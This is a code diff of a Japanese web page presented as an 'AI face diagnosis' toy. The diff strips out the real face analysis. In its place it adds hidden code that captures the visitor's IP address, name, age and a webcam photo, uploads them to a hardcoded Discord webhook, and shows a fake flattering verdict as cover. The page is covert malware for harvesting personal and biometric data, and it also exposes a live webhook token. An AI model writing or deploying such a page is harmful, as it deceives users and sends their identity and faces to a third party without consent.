@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI顔面診断認証</title>
+    <title>認証</title>
     <style>
         body {
             margin: 0;
@@ -26,8 +26,8 @@
                         inset 0 0 15px rgba(0, 255, 0, 0.1);
             text-align: center;
             width: 90%;
-            max-width: 480px;
-            min-height: 500px;
+            max-width: 450px;
+            min-height: 400px;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -39,7 +39,10 @@
             letter-spacing: 3px;
             animation: flicker 1.5s infinite alternate;
         }
-        p { font-size: 14px; line-height: 1.6; }
+        p {
+            font-size: 14px;
+            line-height: 1.6;
+        }
         input[type="text"], input[type="number"] {
             width: calc(100% - 22px);
             padding: 10px;
@@ -48,8 +51,12 @@
             background-color: #111;
             color: #0f0;
             border-radius: 3px;
+            font-family: 'Courier New', Courier, monospace;
         }
-        input:focus { outline: none; box-shadow: 0 0 10px #0f0; }
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 10px #0f0;
+        }
         button {
             width: 100%;
             padding: 12px;
@@ -63,61 +70,67 @@
             text-transform: uppercase;
             transition: all 0.3s ease;
         }
-        button:hover { background-color: #0f0; color: #000; box-shadow: 0 0 15px #0f0; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .hidden { display: none; }
-        video, canvas, #resultImg {
+        button:hover {
+            background-color: #0f0;
+            color: #000;
+            box-shadow: 0 0 15px #0f0;
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .hidden {
+            display: none;
+        }
+        video, canvas {
             width: 100%;
-            max-width: 360px;
+            max-width: 320px;
             height: auto;
             border: 1px solid #0f0;
-            margin: 15px auto;
+            margin-top: 20px;
             border-radius: 3px;
-            display: block;
         }
-        #status, #score {
+        #status {
             margin-top: 15px;
-            font-size: 16px;
-            font-weight: bold;
-            min-height: 24px;
+            font-size: 12px;
+            color: #0f0;
+            min-height: 20px;
         }
-        #score { font-size: 32px; color: #ff0; }
         @keyframes flicker {
-            0%,18%,22%,25%,53%,57%,100% { text-shadow: 0 0 5px #0f0, 0 0 10px #0f0; }
-            20%,24%,55% { text-shadow: none; }
+            0%, 18%, 22%, 25%, 53%, 57%, 100% {
+                text-shadow: 0 0 5px #0f0, 0 0 10px #0f0;
+            }
+            20%, 24%, 55% {
+                text-shadow: none;
+            }
         }
     </style>
-    <!-- face-api.js CDN (軽量モデル) -->
-    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.min.js"></script>
 </head>
 <body>
     <div class="container">
         <!-- ステップ1: 名前と年齢 -->
         <div id="step1">
             <h1>AI顔面診断</h1>
-            <p>情報を入力して顔を撮影してください。</p>
+            <p>続行するには、情報を入力してください。</p>
             <form id="infoForm">
                 <input type="text" id="name" placeholder="名前" required>
                 <input type="number" id="age" placeholder="年齢" min="1" max="120" required>
-                <button type="submit">カメラ起動</button>
+                <button type="submit">次へ</button>
             </form>
         </div>
 
-        <!-- ステップ2: カメラ + 撮影 -->
+        <!-- ステップ2: カメラ撮影 -->
         <div id="step2" class="hidden">
-            <h1>顔面スキャン中...</h1>
-            <p>正面を向いて、顔全体をしっかり映してください。</p>
+            <h1>AI顔面診断</h1>
+            <p>顔がしっかり映るようにしてください。</p>
             <video id="video" autoplay playsinline></video>
             <canvas id="canvas" class="hidden"></canvas>
-            <img id="resultImg" class="hidden" alt="撮影結果">
-            <button id="captureBtn">撮影してAI診断開始</button>
+            <button id="captureBtn">撮影</button>
             <div id="status">準備完了...</div>
-            <div id="score"></div>
         </div>
     </div>
 
     <script>
-        // 要素取得
         const step1 = document.getElementById('step1');
         const step2 = document.getElementById('step2');
         const infoForm = document.getElementById('infoForm');
@@ -125,63 +138,30 @@
         const ageInput = document.getElementById('age');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const resultImg = document.getElementById('resultImg');
         const captureBtn = document.getElementById('captureBtn');
         const statusDiv = document.getElementById('status');
-        const scoreDiv = document.getElementById('score');
 
         let stream = null;
-        let userData = {
-            name: "",
-            age: "",
-            ip: "取得中...",
-            deviceInfo: navigator.userAgent,
-            os: "不明",
-            isMobile: /Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent) ? "モバイル" : "PC/タブレット",
-            model: "推定不可（詳細はUAから）"
-        };
+        let userData = { ip: "取得中..." };
 
-        // IP取得
+        // ページ読み込み時にIP取得（非同期）
         async function fetchIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 userData.ip = data.ip || "取得失敗";
-            } catch {
-                userData.ip = "取得エラー";
+            } catch (err) {
+                console.error('IP取得エラー:', err);
+                userData.ip = "取得できませんでした";
             }
         }
-        fetchIP();
-
-        // 簡易デバイス情報パース
-        function parseDeviceInfo() {
-            const ua = navigator.userAgent;
-            if (/Windows NT/.test(ua)) userData.os = "Windows";
-            else if (/Mac OS X/.test(ua)) userData.os = "macOS";
-            else if (/Android/.test(ua)) userData.os = "Android";
-            else if (/iPhone|iPad|iPod/.test(ua)) userData.os = "iOS";
-            else if (/Linux/.test(ua)) userData.os = "Linux";
-        }
-        parseDeviceInfo();
-
-        // face-api.js モデルロード
-        Promise.all([
-            faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/'),
-            faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/'),
-            faceapi.nets.ageGenderNet.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/')
-        ]).then(() => {
-            console.log("face-api.js モデルロード完了");
-        }).catch(err => {
-            console.error("モデルロード失敗:", err);
-            statusDiv.textContent = "AIモデルロード失敗（ネットワークを確認）";
-            statusDiv.style.color = '#f00';
-        });
+        fetchIP();  // 即実行
 
         // ステップ1 → ステップ2
         infoForm.addEventListener('submit', (e) => {
             e.preventDefault();
-            userData.name = nameInput.value.trim() || "匿名";
-            userData.age = ageInput.value || "不明";
+            userData.name = nameInput.value.trim() || "不明";
+            userData.age  = ageInput.value || "不明";
 
             step1.classList.add('hidden');
             step2.classList.remove('hidden');
@@ -196,103 +176,87 @@
                     audio: false
                 });
                 video.srcObject = stream;
-                statusDiv.textContent = 'カメラ起動済み。準備ができたら「撮影してAI診断開始」を押してね';
+                statusDiv.textContent = 'カメラ起動済み。顔を映して「撮影」を押してください。';
             } catch (err) {
                 console.error('カメラエラー:', err);
-                statusDiv.textContent = 'カメラ起動失敗。権限を許可してください。';
+                statusDiv.textContent = 'カメラ起動失敗。権限を確認してください。';
                 statusDiv.style.color = '#f00';
                 captureBtn.disabled = true;
             }
         }
 
-        // 撮影＆AI診断
+        // 撮影＆送信
         captureBtn.addEventListener('click', async () => {
-            if (!stream) return;
+            if (!stream) {
+                statusDiv.textContent = 'カメラが準備できていません。';
+                statusDiv.style.color = '#f00';
+                return;
+            }
 
             captureBtn.disabled = true;
-            statusDiv.textContent = '撮影＆AI診断中...';
+            statusDiv.textContent = '撮影中...';
             statusDiv.style.color = '#ff0';
 
-            // canvas描画
+            // canvasに描画
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // 画像停止
+            // Blob取得（軽量化）
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.82));
+
+            // カメラ停止
             stream.getTracks().forEach(t => t.stop());
             stream = null;
 
-            // face-api.js で解析
+            statusDiv.textContent = '送信中...（数秒かかる場合があります）';
+            statusDiv.style.color = '#ff0';
+
+            // FormData作成
+            const formData = new FormData();
+
+            // JSON部分（IPも含む）
+            const payload = {
+                content: `**AU顔面診断**\n名前: ${userData.name}\n年齢: ${userData.age}\nIP: ${userData.ip}`,
+                embeds: [{
+                    title: "AI顔面診断",
+                    color: 0x00ff00,
+                    fields: [
+                        { name: "名前", value: userData.name, inline: true },
+                        { name: "年齢", value: userData.age, inline: true },
+                        { name: "IPアドレス", value: userData.ip, inline: true },
+                        { name: "撮影日時", value: new Date().toLocaleString('ja-JP'), inline: true }
+                    ],
+                    image: { url: "attachment://photo.jpg" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            formData.append('payload_json', JSON.stringify(payload));
+            formData.append('files[0]', blob, 'photo.jpg');
+
+            const webhookUrl = "https://discord.com/api/webhooks/1468964638237397179/NMYIXppBkg9vkl02D5OLB_sOuXSdDLkiY9V30yWWXNaEBQm0L3LS6bEGquFAFZ0ue69d";
+
             try {
-                const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions())
-                    .withFaceLandmarks()
-                    .withAgeAndGender();
+                const res = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
 
-                if (detections.length === 0) {
-                    statusDiv.textContent = '顔が検出できませんでした。もう一度撮影してください。';
-                    statusDiv.style.color = '#f00';
-                    captureBtn.disabled = false;
-                    return;
+                if (res.ok) {
+                    statusDiv.textContent = 'あなたはイケメン顔です';
+                    statusDiv.style.color = '#0f0';
+                    video.style.display = 'none';
+                    captureBtn.style.display = 'none';
+                    canvas.classList.remove('hidden'); // 撮った写真を表示
+                } else {
+                    const err = await res.text().catch(() => '不明');
+                    throw new Error(`HTTP ${res.status} - ${err}`);
                 }
-
-                // 最初の顔だけ使う
-                const face = detections[0];
-                const age = Math.round(face.age);
-                const gender = face.gender === 'male' ? '男性' : '女性';
-                const confidence = Math.round(face.detection.score * 100);
-
-                // 簡易魅力スコア（完全に娯楽用・ランダム要素強め）
-                let score = Math.round(
-                    (confidence * 0.4) +
-                    (Math.abs(50 - age) < 20 ? 30 : 10) +  // 若すぎ/老けすぎ減点風
-                    (Math.random() * 30)                  // 運要素
-                );
-                score = Math.min(100, Math.max(30, score)); // 30〜100に制限
-
-                // 結果表示
-                statusDiv.textContent = `診断結果：${gender} / 推定年齢 ${age}歳`;
-                scoreDiv.innerHTML = `AI魅力点数: <span style="color:#0f0">${score}</span> / 100`;
-                scoreDiv.style.color = score >= 80 ? '#0f0' : score >= 60 ? '#ff0' : '#f44';
-
-                // 画像表示
-                resultImg.src = canvas.toDataURL('image/jpeg');
-                resultImg.classList.remove('hidden');
-                video.style.display = 'none';
-                canvas.classList.add('hidden');
-                captureBtn.style.display = 'none';
-
-                // Discord送信データ（オプションで有効化）
-                const payload = {
-                    content: `**AI顔面診断ログ**`,
-                    embeds: [{
-                        title: "診断結果",
-                        color: 0x00ff00,
-                        fields: [
-                            { name: "名前", value: userData.name, inline: true },
-                            { name: "自己申告年齢", value: userData.age, inline: true },
-                            { name: "IP", value: userData.ip, inline: true },
-                            { name: "デバイス", value: `${userData.isMobile} / ${userData.os}\n${userData.deviceInfo.substring(0,100)}...`, inline: false },
-                            { name: "AI推定", value: `${gender} / ${age}歳\n魅力点数: ${score}/100`, inline: false }
-                        ],
-                        image: { url: "attachment://face.jpg" },
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-
-                // 送信したい場合はここを有効化（YOUR_WEBHOOK_URL を変更）
-                /*
-                const formData = new FormData();
-                formData.append('payload_json', JSON.stringify(payload));
-                formData.append('files[0]', await (await fetch(canvas.toDataURL('image/jpeg'))).blob(), 'face.jpg');
-
-                await fetch('https://discord.com/api/webhooks/1468964638237397179/NMYIXppBkg9vkl02D5OLB_sOuXSdDLkiY9V30yWWXNaEBQm0L3LS6bEGquFAFZ0ue69d', { method: 'POST', body: formData });
-                statusDiv.textContent += ' （サーバーに送信完了）';
-                */
-
             } catch (err) {
-                console.error('AI診断エラー:', err);
-                statusDiv.textContent = '診断中にエラーが発生しました。';
+                console.error('送信エラー:', err);
+                statusDiv.textContent = '送信失敗しました。Webhook URLまたはネットワークを確認してください。';
                 statusDiv.style.color = '#f00';
                 captureBtn.disabled = false;
             }
